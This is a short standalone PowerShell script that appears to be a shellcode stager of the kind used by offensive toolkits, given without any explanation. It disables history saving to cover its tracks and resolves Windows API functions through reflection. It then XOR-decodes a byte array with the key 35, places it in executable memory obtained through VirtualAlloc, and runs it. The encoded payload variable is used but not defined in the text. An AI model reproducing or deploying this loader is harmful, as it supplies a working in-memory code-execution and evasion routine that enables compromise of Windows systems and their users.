Set-StrictMode  -Version 2
Set-PSReadlineOption  -HistorySaveStyle SaveNothing
function g1getFFAA { Param ($v_module, $v_procedure); $v_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'); $v_gpa = $v_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string')); return $v_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($v_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($v_module)))), $v_procedure)) }

function g2getFFAAB77 { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $v_parameters, [Parameter(Position = 1)] [Type] $v_return_type = [Void]); $v_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]); $v_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $v_parameters).SetImplementationFlags('Runtime, Managed'); $v_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $v_return_type, $v_parameters).SetImplementationFlags('Runtime, Managed'); return $v_type_builder.CreateType() };

for ($i = 0; $i -lt $var_code.Count; $i++) { $var_code[$i] = 35 -bxor $var_code[$i] };        
$v_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((g1getFFAA kernel32.dll VirtualAlloc), (g2getFFAAB77 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));
$v_buffer = $v_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $v_buffer, $var_code.length);
$v_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($v_buffer, (g2getFFAAB77 @([IntPtr]) ([Void])));
$v_runme.Invoke([IntPtr]::Zero)
